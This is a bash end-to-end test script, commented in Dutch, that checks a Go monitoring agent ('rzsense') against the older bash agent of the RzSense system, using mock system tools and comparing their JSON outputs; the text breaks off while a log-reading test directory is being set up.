#!/usr/bin/env bash
# shellcheck disable=SC2016  # PHP-code tussen enkele aanhalingstekens: $ hoort bij PHP, niet bij bash
# 1.339.0: de Go-agent voor Linux (het commando rzsense) tegen een draaiende RzSense, als proef naast de bash-agent.
# Een server "go-e2e" met een eigen sleutel aanmaken, de instellingen en sleutel van de "bash-agent" in een tijdelijke map
# zetten, en dan: rzsense test, doctor en shadow. Daarna controleren dat RzSense de proefronde apart bewaarde en dat de
# server zelf (contactmoment, versie, sleutel) en de bestanden van de bash-agent niet veranderd zijn.
#   BASE=http://127.0.0.1:8099 bash tests/agent-go-shadow.sh
set -euo pipefail
cd "$(dirname "$0")/.."
BASE=${BASE:-http://127.0.0.1:8099}
work=$(mktemp -d)
trap 'rm -rf "$work"; php -r "require \"src/bootstrap.php\"; q(\"DELETE FROM hosts WHERE name = ?\", [\"go-e2e\"]);" 2>/dev/null || true' EXIT
fail() { echo "✘ $1"; exit 1; }

(cd agent-win && CGO_ENABLED=0 go build -trimpath -o "$work/rzsense" .)
[ "$("$work/rzsense" version)" = "rzsense $(tr -d '[:space:]' < agent-win/VERSION)" ] || fail "rzsense version klopt niet met agent-win/VERSION"

key=$(php -r '
require "src/bootstrap.php";
q("DELETE FROM hosts WHERE name = ?", ["go-e2e"]);
q("INSERT INTO hosts (name, address, mode) VALUES (?, ?, ?)", ["go-e2e", "192.0.2.11", "agent"]);
echo AgentCrypto::newHostKey((int) db()->lastInsertId(), false);')
[[ "$key" =~ ^[0-9a-f]{64}$ ]] || fail "geen sleutel voor de testserver"
mkdir -p "$work/keys" "$work/data"
# 1.341.0: een certificaat met keten (bestand), een bron waar niets luistert, en twee proces-checks (naam en patroon)
mkdir -p "$work/certs" "$work/cache"
openssl req -x509 -newkey rsa:2048 -nodes -keyout "$work/certs/ca.key" -out "$work/certs/ca.pem" -days 30 -subj "/O=Proef BV/CN=Proef CA" >/dev/null 2>&1
openssl req -newkey rsa:2048 -nodes -keyout "$work/certs/leaf.key" -out "$work/certs/leaf.csr" -subj "/CN=nas.voorbeeld" >/dev/null 2>&1
openssl x509 -req -in "$work/certs/leaf.csr" -CA "$work/certs/ca.pem" -CAkey "$work/certs/ca.key" -CAcreateserial -out "$work/certs/leaf.pem" -days 90 >/dev/null 2>&1
cat "$work/certs/leaf.pem" "$work/certs/ca.pem" >"$work/certs/fullchain.pem"
# Los van dit script gestart: de bash-agent slaat zijn eigen kinderen over, en hier is dit script "de agent"
# Onder een eigen naam: op een drukke machine draait er zomaar een andere "sleep" die tussen de twee metingen stopt
cp "$(command -v sleep)" "$work/rzproef-slaap"
("$work/rzproef-slaap" 31337 >/dev/null 2>&1 & echo $! >"$work/sleeper.pid")
sleeper=$(cat "$work/sleeper.pid")
trap 'kill "$sleeper" 2>/dev/null || true; rm -rf "$work"; php -r "require \"src/bootstrap.php\"; q(\"DELETE FROM hosts WHERE name = ?\", [\"go-e2e\"]);" 2>/dev/null || true' EXIT
CERT_SOURCES="$work/certs/fullchain.pem 127.0.0.1:1"
printf 'MONITOR_URL="%s"\nSERVICES="sshd"\nCERTS="%s"\n' "$BASE" "$CERT_SOURCES" >"$work/rzmon-agent"
printf '7\tsvc\tcron\t\n8\tival\t60\t\n21\tproc\tname\t%s\t\n22\tproc\tpattern\t%s\t\n23\tproc\tname\t%s\t\n' \
    "$(printf 'rzproef-slaap' | base64)" "$(printf 'rzproef-slaap 3133[7]$' | base64)" "$(printf 'bestaat-niet-xyz' | base64)" >"$work/cache/tests.cache"
printf '%s\n' "$key" >"$work/keys/agent.key"
before=$(cat "$work/rzmon-agent" "$work/keys/agent.key" "$work/cache/tests.cache" "$work/certs/fullchain.pem" | sha256sum)
export RZSENSE_BASH_CONF="$work/rzmon-agent" RZSENSE_BASH_KEYS="$work/keys" RZSENSE_DATA="$work/data" RZSENSE_BASH_CACHE="$work/cache"

out=$("$work/rzsense" test) || fail "rzsense test: $out"
grep -q 'herkent deze server als "go-e2e"' <<<"$out" || fail "rzsense test herkent de server niet: $out"
echo "✔ rzsense test: RzSense herkent de server, het antwoord is versleuteld met de eigen sleutel"

# Wat de bash-agent "net meldde": de metingen van deze machine zelf (zo horen de twee gelijk te zijn)
"$work/rzsense" collect >"$work/core.json"
CORE="$work/core.json" php -r '
require "src/bootstrap.php";
$c = json_decode((string) file_get_contents(getenv("CORE")), true);
$id = (int) q("SELECT id FROM hosts WHERE name = ?", ["go-e2e"])->fetchColumn();
AgentData::put($id, "cpu", $c["cpu"]);
AgentData::put($id, "mem", $c["mem"]);
AgentData::put($id, "boot", (string) $c["boot"]);
foreach ($c["disks"] as $d) { AgentData::put($id, "disk:" . $d["mount"], ["total" => $d["total"], "avail" => $d["avail"]]); }
foreach ($c["svc"] as $n => $d) { AgentData::put($id, "svcinfo:" . $n, $d); }   // 1.342.0: dienstdetails, extra tests, dienstenlijst
foreach ($c["svc_tests"] as $n => $d) { AgentData::put($id, "svctest:" . $n, $d); }
if ($c["svc_list"]) { AgentData::put($id, "svclist", $c["svc_list"]); }
AgentData::put($id, "ports", $c["ports"]);   // 1.340.0: poorten en diensten
foreach ($c["services"] as $n => $st) { AgentData::put($id, "service:" . $n, $st); }'
# 1.341.0: certificaten en processen meet hier de échte code van de bash-agent (uit agent/src), niet de Go-agent zelf
# shellcheck disable=SC2034,SC2154  # de variabelen horen bij de code van de bash-agent die hier wordt ingelezen
bash_out=$(
    set +eu
    # shellcheck disable=SC1090
    source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^cert_line() {/,/^certs=""/p' agent/src/75-certificaten-processen-software.sh | sed '$d')
    cert_list="$CERT_SOURCES"
    printf 'CERTS\t[%s]\n' "$(collect_certs | sed 's/,$//')"
    HA_MODE=0; TEST=0; t_cache="$work/cache/tests.cache"
    # shellcheck disable=SC1090
    source <(sed -n '/^procs_json=""; proc_list=""/,/^# -\{10,\} Software/p' agent/src/75-certificaten-processen-software.sh | sed '$d')
    printf 'PROCS\t{%s}\n' "${procs_json%,}"
    printf 'PLIST\t[%s]\n' "${proc_list%,}"
)
BASH_OUT="$bash_out" php -r '
require "src/bootstrap.php";
$id = (int) q("SELECT id FROM hosts WHERE name = ?", ["go-e2e"])->fetchColumn();
$in = [];
foreach (explode("\n", (string) getenv("BASH_OUT")) as $l) { [$k, $v] = array_pad(explode("\t", $l, 2), 2, ""); $in[$k] = json_decode($v, true); }
if (!is_array($in["CERTS"] ?? null) || !is_array($in["PROCS"] ?? null) || !is_array($in["PLIST"] ?? null)) { fwrite(STDERR, "de bash-code gaf geen geldige JSON: " . getenv("BASH_OUT")); exit(1); }
foreach ($in["CERTS"] as $c) { AgentData::put($id, "cert:" . $c["source"], array_diff_key($c, ["source" => 1])); }
foreach ($in["PROCS"] as $pid => $p) { AgentData::put($id, "proc:" . (int) $pid, $p); }
AgentData::put($id, "proclist", $in["PLIST"]);
echo count($in["CERTS"]), " ", count($in["PROCS"]), " ", count($in["PLIST"]), "\n";' >"$work/bash.n" || fail "de bash-code voor certificaten en processen draaide niet"
read -r n_cert n_proc n_plist <"$work/bash.n"
if [ "$n_cert" != 2 ] || [ "$n_proc" != 3 ] || [ "$n_plist" -lt 3 ]; then fail "de bash-agent mat iets anders dan verwacht: $n_cert certificaten, $n_proc proces-checks, $n_plist processen"; fi
echo "✔ de bash-code mat $n_cert certificaten, $n_proc proces-checks en $n_plist processen om mee te vergelijken"
[ "$(php -r 'echo count(json_decode((string) file_get_contents($argv[1]), true)["services"]);' "$work/core.json")" = 2 ] || fail "de Go-agent vond de twee diensten uit de testlijst en SERVICES niet"
if command -v ss >/dev/null 2>&1; then
    want=$(ss -Htln | awk '{ a = $4; p = a; sub(/.*:/, "", p); sub(/:[^:]*$/, "", a); gsub(/[\[\]]/, "", a); print p "|" a }' | sort -u | tr '\n' ' ')
    got=$(php -r 'foreach (json_decode((string) file_get_contents($argv[1]), true)["ports"] as $p) { echo $p["port"], "|", $p["addr"], "\n"; }' "$work/core.json" | sort -u | tr '\n' ' ')
    [ "$want" = "$got" ] || fail "poorten verschillen van ss: ss [$want] go [$got]"
    echo "✔ dezelfde luisterende poorten als ss"
fi
seen=$(php -r 'require "src/bootstrap.php"; echo json_encode(q("SELECT agent_seen, agent_version, agent_key, agent_key_id, enc_seen FROM hosts WHERE name = ?", ["go-e2e"])->fetch());')

out=$("$work/rzsense" shadow) || fail "rzsense shadow: $out"
grep -Eq '✔ ([0-9]+) van \1 metingen gelijk' <<<"$out" || fail "de proefronde was niet helemaal gelijk: $out"
php -r '
require "src/bootstrap.php";
$id = (int) q("SELECT id FROM hosts WHERE name = ?", ["go-e2e"])->fetchColumn();
$k = array_column(AgentShadow::get($id)["shadow"]["items"], "k");
foreach (["certificaten: lijst", "proces-check #21", "proces-check #22", "proces-check #23", "processen: lijst"] as $want) { if (!in_array($want, $k, true)) { fwrite(STDERR, "niet vergeleken: $want\n"); exit(1); } }
if (count(array_filter($k, static fn($x) => str_starts_with($x, "certificaat "))) !== 2) { fwrite(STDERR, "niet beide certificaten vergeleken\n"); exit(1); }' || fail "certificaten of processen zijn niet vergeleken"
first=${out%%$'\n'*}
echo "✔ rzsense shadow: ${first#* ✔ }"
"$work/rzsense" shadow --quiet >/dev/null || fail "tweede proefronde mislukt"
[ -s "$work/data/certs.cache" ] || fail "de Go-agent bewaart de certificaten niet (dan leest hij ze elke minuut opnieuw)"

got=$(php -r '
require "src/bootstrap.php";
$id = (int) q("SELECT id FROM hosts WHERE name = ?", ["go-e2e"])->fetchColumn();
$s = AgentShadow::get($id)["shadow"];
echo implode(" ", [$s["rounds"], $s["rounds_ok"], $s["version"], $s["n"] >= 8 ? "ok" : "weinig", $s["live"] ? "live" : "oud"]), "\n", implode(", ", array_column(array_filter($s["items"], static fn($i) => !$i["ok"]), "k"));')
gv=$(tr -d '[:space:]' < agent-win/VERSION)
# De eerste ronde was hierboven al precies gelijk. De tweede meet een paar seconden later tegen dezelfde "bash-meting": op
# een drukke machine kan er dan iets verschoven zijn (een proces erbij, de belasting). Dat is geen fout van de agent.
case "${got%%$'\n'*}" in
    "2 2 $gv ok live") ;;
    "2 1 $gv ok live") echo "  (de tweede proefronde verschilde op: ${got#*$'\n'}; de eerste was precies gelijk)" ;;
    *) fail "RzSense bewaarde iets anders dan verwacht: $got" ;;
esac
echo "✔ RzSense bewaarde de proef apart: 2 rondes geteld, met de versie van de Go-agent"

after=$(php -r 'require "src/bootstrap.php"; echo json_encode(q("SELECT agent_seen, agent_version, agent_key, agent_key_id, enc_seen FROM hosts WHERE name = ?", ["go-e2e"])->fetch());')
[ "$seen" = "$after" ] || fail "de proefronde veranderde de server in RzSense (contactmoment, versie of sleutel)"
[ "$before" = "$(cat "$work/rzmon-agent" "$work/keys/agent.key" "$work/cache/tests.cache" "$work/certs/fullchain.pem" | sha256sum)" ] || fail "de bestanden van de bash-agent zijn veranderd"
[ "$(find "$work/keys" -type f | wc -l)" = 1 ] || fail "er is iets bijgeschreven in de sleutelmap van de bash-agent"
echo "✔ de server in RzSense en de bestanden van de bash-agent zijn niet veranderd"

# Een verkeerde sleutel wordt geweigerd, en doctor zegt wat er mis is
printf '%s\n' "$(printf 'ab%.0s' $(seq 32))" >"$work/keys/agent.key"
if "$work/rzsense" shadow --quiet 2>/dev/null; then fail "een proefronde met een verkeerde sleutel werd aangenomen"; fi
doc=$("$work/rzsense" doctor 2>&1) && fail "doctor vond niets bij een verkeerde sleutel"
if ! grep -q '✘ RzSense herkent deze server' <<<"$doc" || ! grep -q 'koppel' <<<"$doc"; then fail "doctor legt de verkeerde sleutel niet uit: $doc"; fi
echo "✔ een verkeerde sleutel wordt geweigerd; rzsense doctor zegt wat je eraan doet"
printf '%s\n' "$key" >"$work/keys/agent.key"
st=$("$work/rzsense" status)
grep -q 'Eigen sleutel: true' <<<"$st" || fail "rzsense status toont de sleutel niet: $st"
echo "✔ rzsense status"

# 1.345.0 (Go-agent 0.14.0): logins, sudo en su lezen: dezelfde regels door de echte bash-code en door de Go-agent
CACHE_DIRECTORY="$work/cache" bash agent/rzmon-agent.sh --auth-parse <tests/data/auth-go.lines >"$work/auth.bash.json" || fail "de bash-agent kon de logins niet lezen"
"$work/rzsense" auth-parse <tests/data/auth-go.lines >"$work/auth.go.json" || fail "de Go-agent kon de logins niet lezen"
python3 -I - "$work/auth.bash.json" "$work/auth.go.json" <<'PY' || fail "de Go-agent leest logins anders dan de bash-agent"
import json, sys
a, b = [json.load(open(p))['auth'] for p in sys.argv[1:3]]
for d in (a, b):
    d['fails'] = sorted(d['fails'], key=lambda f: json.dumps(f, sort_keys=True))   # bash telt op in willekeurige volgorde
for k in ('events', 'fails', 'tries'):
    for x, y in zip(a[k], b[k]):
        if x != y:
            print('verschil in', k, '\n bash', json.dumps(x, ensure_ascii=False), '\n go  ', json.dumps(y, ensure_ascii=False))
if a != b or len(a['events']) < 8 or len(a['fails']) < 8 or len(a['tries']) < 16:
    sys.exit(1)
print('✔ logins, sudo en su: %d gebeurtenissen, %d soorten mislukte pogingen en %d losse pogingen, gelijk aan de bash-agent' % (len(a['events']), len(a['fails']), len(a['tries'])))
PY

# 1.346.0 (Go-agent 0.15.0): welke updates er klaarstaan: de echte bash-code en de Go-agent met dezelfde (namaak-)dnf
mkdir -p "$work/pbin" "$work/patchcache"
cat >"$work/pbin/dnf" <<'EOS'
#!/bin/sh
# namaak-dnf voor de tests: vaste uitvoer voor check-update, en de voortgang van een upgrade
case "$*" in
    *check-update*--security*) printf '\nopenssl-libs.x86_64   1:3.2.2-6.el9_5.1   baseos\nkernel.x86_64   5.14.0-503.21.1.el9_5   baseos\n'; exit 100 ;;
    *check-update*) printf '\nopenssl-libs.x86_64   1:3.2.2-6.el9_5.1   baseos\nkernel.x86_64   5.14.0-503.21.1.el9_5   baseos\ntzdata.noarch   2025a-1.el9   baseos\nbash-completion.noarch   1:2.11-5.el9   appstream\nObsoleting Packages\nrommel zonder versie hier\n'; exit 100 ;;
    *"-y upgrade"*) printf 'Downloading Packages:\n(1/2): tzdata-2025a-1.el9.noarch.rpm   1.2 MB/s\n(2/2): openssl-libs-3.2.2-6.el9_5.1.x86_64.rpm\nRunning transaction\n  Upgrading        : tzdata-2025a-1.el9.noarch    1/4\n  Upgrading        : openssl-libs-1:3.2.2-6.el9_5.1.x86_64    2/4\n  Verifying        : tzdata-2025a-1.el9.noarch    1/4\nComplete!\n'; echo "$*" >>"$DNF_LOG"; exit 0 ;;
esac
exit 1
EOS
printf '#!/bin/sh\nexit 1\n' >"$work/pbin/needs-restarting"
chmod 755 "$work/pbin/dnf" "$work/pbin/needs-restarting"
printf '0\ttick\t60\n0\tpatch\t1\n' >"$work/patchcache/tests.cache"
unset INVOCATION_ID   # op een CI-runner onder systemd: de namaak-pakketbeheerder rechtstreeks starten, niet via systemd-run
export RZSENSE_TEST_ROOT=1
(
    PATH="$work/pbin:$PATH"; t_dir="$work/patchcache"; t_cache="$t_dir/tests.cache"; HA_MODE=0; pk_dir="$t_dir/pkgs"
    id() { if [ "${1-}" = -u ]; then echo 0; else command id "$@"; fi; }   # CI draait niet als root; de pakketbeheerder is hier namaak
    # shellcheck disable=SC1090
    source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^patch_json=""; ha_upd_json=""/,/^ha_update() {/p' agent/src/66-updates.sh | sed '$d')
    printf '%s' "$patch_json" >"$work/patch.bash.json"
) || fail "de bash-code voor Updates faalde"
PATH="$work/pbin:$PATH" "$work/rzsense" patch-check >"$work/patch.go.json" || fail "de Go-agent kon de updates niet lezen"
python3 -I - "$work/patch.bash.json" "$work/patch.go.json" <<'PY' || fail "de Go-agent leest de updates anders dan de bash-agent"
import json, sys
a, b = [json.load(open(p)) for p in sys.argv[1:3]]
for d in (a, b):
    d.pop('at'); d['list'] = sorted(d['list'])
if a != b or a['avail'] != 4 or a['sec'] != 2 or a['rb'] != 1 or a['mgr'] != 'rpm':
    print('bash', json.dumps(a)); print('go  ', json.dumps(b)); sys.exit(1)
print('✔ updates: %d klaar, %d beveiliging, herstart nodig: gelijk aan de bash-agent' % (a['avail'], a['sec']))
PY

# 1.347.0 (Go-agent 0.16.0): de softwarelijst van deze machine zelf: de echte bash-code en de Go-agent
mkdir -p "$work/swcache"
(
    t_dir="$work/swcache"; HA_MODE=0; TEST=0
    id() { if [ "${1-}" = -u ]; then echo 0; else command id "$@"; fi; }
    # shellcheck disable=SC1090
    source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^ss_listen() {/,/^}/p' agent/src/00-kop.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^pkg_owners() {/,/^}/p' agent/src/64-programmas.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^pkgs_json=""; pk_hash=""; pk_mgr=""/,/^# Uitkomst van "pakketten bijwerken"/p' agent/src/75-certificaten-processen-software.sh | sed '$d')
) || fail "de bash-code voor de softwarelijst faalde"
[ -s "$work/swcache/pkgs/list.json" ] || fail "de bash-code maakte geen softwarelijst"
"$work/rzsense" software-check >"$work/sw.go.json" || fail "de Go-agent kon de softwarelijst niet maken"
python3 -I - "$work/swcache/pkgs/list.json" "$work/sw.go.json" <<'PY' || fail "de Go-agent maakt een andere softwarelijst dan de bash-agent"
import json, sys
a, b = [json.load(open(p)) for p in sys.argv[1:3]]
bad = []
for k in ('mgr', 'os', 'kernel', 'restart'):
    if a[k] != b[k]:
        bad.append('%s: bash %r, go %r' % (k, a[k], b[k]))
la, lb = sorted(map(tuple, a['list'])), sorted(map(tuple, b['list']))
if la != lb:
    bad.append('pakketten: bash %d, go %d; alleen bash %r; alleen go %r' % (len(la), len(lb), sorted(set(la) - set(lb))[:3], sorted(set(lb) - set(la))[:3]))
ea, eb = sorted(set(map(tuple, a['exposed']))), sorted(set(map(tuple, b['exposed'])))
if ea != eb:
    bad.append('bereikbaar: bash %r, go %r' % (ea, eb))
if bad or len(la) < 50:
    print('\n'.join(bad) or 'te weinig pakketten'); sys.exit(1)
print('✔ softwarelijst: %d pakketten, %d bereikbaar via het netwerk, systeem en kernel: gelijk aan de bash-agent' % (len(la), len(ea)))
PY

# 1.348.0 (Go-agent 0.17.0): schijfgezondheid, UPS en een pad-check: de echte bash-code en de Go-agent met dezelfde
# (namaak-)hulpmiddelen, zodat de uitvoer vaststaat
mkdir -p "$work/hbin" "$work/hcache"
cat >"$work/hbin/smartctl" <<'EOS'
#!/bin/sh
case "$*" in
    --scan) printf '/dev/sda -d sat # /dev/sda [SAT], ATA device\n/dev/nvme0 -d nvme # /dev/nvme0, NVMe device\n/dev/sdb -d sat # /dev/sdb [SAT], ATA device\n/dev/sdc -d scsi # /dev/sdc, SCSI device\n# een regel zonder apparaat\n' ;;
    *"/dev/sda") cat <<'EOT'
Device Model:     Samsung SSD 870 EVO 1TB
SMART overall-health self-assessment test result: PASSED
ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE
  5 Reallocated_Sector_Ct   0x0033   100   100   010    Pre-fail  Always       -       0
177 Wear_Leveling_Count     0x0013   097   097   000    Pre-fail  Always       -       61
190 Airflow_Temperature_Cel 0x0032   071   052   000    Old_age   Always       -       29
197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       2
EOT
        ;;
    *"/dev/nvme0") cat <<'EOT'
Model Number:                       WD "Black" SN850X 2000GB
SMART overall-health self-assessment test result: FAILED!
Temperature:                        41 Celsius
Percentage Used:                    3%
Media and Data Integrity Errors:    1,204
EOT
        ;;
    *"/dev/sdb") echo "Device is in STANDBY mode, exit(2)"; exit 2 ;;
    *) exit 1 ;;
esac
EOS
cat >"$work/hbin/upsc" <<'EOS'
#!/bin/sh
case "$*" in
    -l) echo apc ;;
    apc@localhost) printf 'battery.charge: 97\nbattery.runtime: 1830\ndevice.model: Back-UPS "RS" 900G\nups.load: 22.5\nups.status: OL CHRG\n' ;;
    *) exit 1 ;;
esac
EOS
cat >"$work/hbin/mtr" <<'EOS'
#!/bin/sh
printf 'Start: 2026-11-27T12:00:00+0100\nHOST: nas             Loss%%   Snt   Last   Avg  Best  Wrst StDev\n  1.|-- 192.168.2.1      0.0%%     5    0.4   0.5   0.3   0.8   0.1\n  2.|-- ???             100.0     5    0.0   0.0   0.0   0.0   0.0\n  3.|-- 203.0.113.1     20.0%%     5   11.2  12.4   9.8  15.0   2.2\n'
EOS
cat >"$work/hbin/ping" <<'EOS'
#!/bin/sh
for a in "$@"; do last=$a; done
case "$last" in
    192.0.2.10) printf 'PING 192.0.2.10 56(84) bytes of data.\n\n--- 192.0.2.10 ping statistics ---\n5 packets transmitted, 0 received, 100%% packet loss, time 812ms\n'; exit 1 ;;
    *) printf 'PING %s 56(84) bytes of data.\n\n--- %s ping statistics ---\n5 packets transmitted, 5 received, 0%% packet loss, time 804ms\nrtt min/avg/max/mdev = 0.311/0.402/0.588/0.097 ms\n' "$last" "$last" ;;
esac
EOS
printf '#!/bin/sh\necho kvm\n' >"$work/hbin/systemd-detect-virt"
cat >"$work/hbin/lldpctl" <<'EOS'
#!/bin/sh
printf 'lldp.%s.chassis.name=sw-kelder\nlldp.%s.port.ifname=ge-0/0/7\nlldp.%s.port.descr=Poort "7" = server\n' "$3" "$3" "$3"
EOS
chmod 755 "$work/hbin/"*
printf '0\ttick\t60\n31\tpath\t127.0.0.1\t192.0.2.9,192.0.2.10\t300\n' >"$work/hcache/tests.cache"
(
    PATH="$work/hbin:$PATH"; t_dir="$work/hcache"; t_cache="$t_dir/tests.cache"; HA_MODE=0; TEST=0
    id() { if [ "${1-}" = -u ]; then echo 0; else command id "$@"; fi; }
    # shellcheck disable=SC1090
    source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^due_cached() {/,/^}/p' agent/src/40-basis-meten.sh)
    lap() { :; }
    # shellcheck disable=SC1090
    source <(sed -n '/^smart_json=""/,/^# WireGuard/p' agent/src/85-meesturen.sh | sed '$d')
    # shellcheck disable=SC1090
    source <(sed -n '/^path_json=""; iperfs_json=""/,$p' agent/src/74-pad.sh)
    printf '{"smart":%s,"ups":%s,"path":%s}' "${smart_json:-null}" "${ups_json:-null}" "${path_json:-null}" >"$work/health.bash.json"
) || fail "de bash-code voor SMART, UPS of pad-checks faalde"
PATH="$work/hbin:$PATH" RZSENSE_DATA="$work/hdata" "$work/rzsense" collect >"$work/health.go.json" || fail "de Go-agent kon SMART en UPS niet lezen"
PATH="$work/hbin:$PATH" RZSENSE_DATA="$work/hdata" "$work/rzsense" path-check 127.0.0.1 192.0.2.9,192.0.2.10 >"$work/path.go.json" || fail "de Go-agent kon het pad niet meten"
python3 -I - "$work/health.bash.json" "$work/health.go.json" "$work/path.go.json" <<'PY' || fail "de Go-agent meet SMART, UPS of het pad anders dan de bash-agent"
import json, sys
a, g, gp = [json.load(open(p)) for p in sys.argv[1:4]]
bad = []
for k in ('smart', 'ups'):
    if a[k] != g[k]:
        bad.append('%s:\n bash %s\n go   %s' % (k, json.dumps(a[k], ensure_ascii=False), json.dumps(g[k], ensure_ascii=False)))
bp = a['path']['31']
for d in (bp, gp):
    d.pop('at')
gp['virt'] = bp['virt']   # path-check krijgt de virtualisatie niet mee (die wordt één keer per ronde bepaald)
if bp != gp:
    bad.append('pad:\n bash %s\n go   %s' % (json.dumps(bp, ensure_ascii=False), json.dumps(gp, ensure_ascii=False)))
if bad or len(a['smart']) != 4 or len(bp['hops']) != 3 or len(bp['via']) != 2:
    print('\n'.join(bad) or 'onverwachte testgegevens'); sys.exit(1)
print('✔ schijfgezondheid (4 schijven), UPS en een pad-check (3 hops, 2 tussenliggende apparaten, LLDP): gelijk aan de bash-agent')
PY

# 1.349.0 (Go-agent 0.18.0): commando-checks: dezelfde commando's door de echte bash-code en door de Go-agent
mkdir -p "$work/ccache" "$work/cdata"
b64() { printf '%s' "$1" | base64 -w0; }
{
    printf '0\ttick\t60\n'
    printf '41\tcmd\t%s\t10\tnobody\t60\n' "$(b64 'echo hallo; echo "regel twee"; echo fout >&2; exit 3')"
    printf '42\tcmd\t%s\t1\tnobody\t60\n' "$(b64 'sleep 5')"
    printf '43\tcmd\t%s\t10\tnobody\t60\n' "$(b64 'env | grep -v "^_=" | sort; pwd; id -un')"
    printf '44\tcmd\t%s\t10\tnobody\t60\n' "$(b64 "printf 'tab\\there\\n\\nlaatste\\n\\n'; printf 'x\\001y\\r\\n' >&2")"
    printf '45\tcmd\t!!!geen-base64\t10\tnobody\t60\n'
    printf '46\tcmd\t%s\t999\traar\tx\n' "$(b64 'echo "wie: $(id -un)"')"
} >"$work/ccache/tests.cache"
(
    t_dir="$work/ccache"; t_cache="$t_dir/tests.cache"; HA_MODE=0; TEST=1; COMMANDS=""
    lap() { :; }
    # shellcheck disable=SC1090
    source <(sed -n '/^json_text() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^bg_launch() {/,/^# -\{10,\} Logbestanden doorzoeken/p' agent/src/50-services-commandos-logs.sh | sed '$d')
    printf '{%s}' "${cmd_results%,}" >"$work/cmd.bash.json"
) || fail "de bash-code voor commando-checks faalde"
RZSENSE_BASH_CACHE="$work/ccache" RZSENSE_DATA="$work/cdata" "$work/rzsense" cmd-check >"$work/cmd.go.json" || fail "de Go-agent kon de commando-checks niet uitvoeren"
python3 -I - "$work/cmd.bash.json" "$work/cmd.go.json" <<'PY' || fail "de Go-agent voert commando-checks anders uit dan de bash-agent"
import json, sys
a, b = [json.load(open(p)) for p in sys.argv[1:3]]
bad = []
for d in (a, b):
    for v in d.values():
        v.pop('ms', None); v.pop('at', None)
for k in sorted(set(a) | set(b)):
    if a.get(k) != b.get(k):
        bad.append('#%s:\n bash %s\n go   %s' % (k, json.dumps(a.get(k), ensure_ascii=False), json.dumps(b.get(k), ensure_ascii=False)))
if bad or a['41']['rc'] != 3 or a['42']['rc'] != 124 or 'error' not in a['45'] or 'HOME=/' not in a['43']['out']:
    print('\n'.join(bad) or 'onverwachte uitkomst: %s' % json.dumps(a)); sys.exit(1)
print('✔ commando-checks: exitcode, uitvoer, time-out, kale omgeving en een ongeldig commando: gelijk aan de bash-agent (als %s)' % a['46']['out'].split(': ')[-1])
PY
# Een volgende meting loopt op de achtergrond: nu gaat het vorige resultaat mee, daarna het nieuwe
echo active >"$work/cdata/mode"
at1=$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["at"])' "$work/cdata/cmdstate/41.json")
touch -d '10 minutes ago' "$work/cdata/cmdstate/41.json"
sleep 1
got=$(RZSENSE_BASH_CACHE="$work/ccache" RZSENSE_DATA="$work/cdata" "$work/rzsense" cmd-check | python3 -I -c 'import json,sys; print(json.load(sys.stdin)["41"]["at"])')
[ "$got" = "$at1" ] || fail "bij een volgende meting hoort eerst het vorige resultaat mee te gaan"
for _ in 1 2 3 4 5 6 7 8 9 10; do [ -s "$work/cdata/cmdstate/41.done" ] && break; sleep 0.5; done
[ -s "$work/cdata/cmdstate/41.done" ] || fail "de meting op de achtergrond kwam niet klaar"
got=$(RZSENSE_BASH_CACHE="$work/ccache" RZSENSE_DATA="$work/cdata" "$work/rzsense" cmd-check | python3 -I -c 'import json,sys; d=json.load(sys.stdin)["41"]; print(d["rc"], d["at"] > int(sys.argv[1]))' "$at1")
[ "$got" = "3 True" ] || fail "het resultaat van de meting op de achtergrond ging niet mee: $got"
{ [ ! -e "$work/cdata/cmdstate/41.lock" ] && [ ! -e "$work/cdata/cmdstate/41.done" ]; } || fail "na de meting op de achtergrond bleven er bestanden staan"
echo "✔ commando-checks: een volgende meting loopt op de achtergrond en houdt het rapport niet op"
rm -f "$work/cdata/mode"

# De noodrem op de server: met COMMANDS=0 voert de Go-agent niets uit
printf 'MONITOR_URL="%s"\nCOMMANDS="0"\n' "$BASE" >"$work/rzmon-agent.blok"
got=$(RZSENSE_BASH_CONF="$work/rzmon-agent.blok" RZSENSE_BASH_CACHE="$work/ccache" RZSENSE_DATA="$work/cdata2" "$work/rzsense" cmd-check)
python3 -I -c 'import json,sys; d=json.loads(sys.argv[1]); sys.exit(0 if d and all("blocked" in v for v in d.values()) else 1)' "$got" || fail "met COMMANDS=0 hoort de Go-agent geen commando uit te voeren: $got"
[ ! -d "$work/cdata2/cmdstate" ] || [ -z "$(ls "$work/cdata2/cmdstate")" ] || fail "met COMMANDS=0 is er toch iets uitgevoerd"
echo "✔ commando-checks: met COMMANDS=0 op de server voert de Go-agent niets uit"

# 1.350.0 (Go-agent 0.19.0): logs. Een map met logs, geheimen en gedraaide bestanden; de echte bash-code en de Go-agent
# lezen dezelfde bestanden, elk met hun eigen bladwijzers.
L="$work/lt"
mkdir -p "$L/var/log/app" "$L/var/log/journal" "$L/var/log/private" "$L/opt/dienst/logs" "$L/opt/dienst/.ssh" "$L/opt/dienst/secrets" "$L/opt/ander" "$L/elders" "$L/bt" "$L/gt" "$L/bk" "$L/gk" "$L/gd"
printf 'oud\n' >"$L/var/log/app/app.log"; printf 'oud\n' >"$L/var/log/syslog"; printf 'x\n' >"$L/var/log/app/app.log.1"; printf 'x\n' >"$L/var/log/app/oud.log.gz"
printf 'x\n' >"$L/var/log/app/app-20260101.log"; printf 'a\0b\n' >"$L/var/log/binair.log"; printf 'x\n' >"$L/var/log/wtmp"; printf 'x\n' >"$L/var/log/journal/j.log"; printf 'x\n' >"$L/var/log/private/p.log"
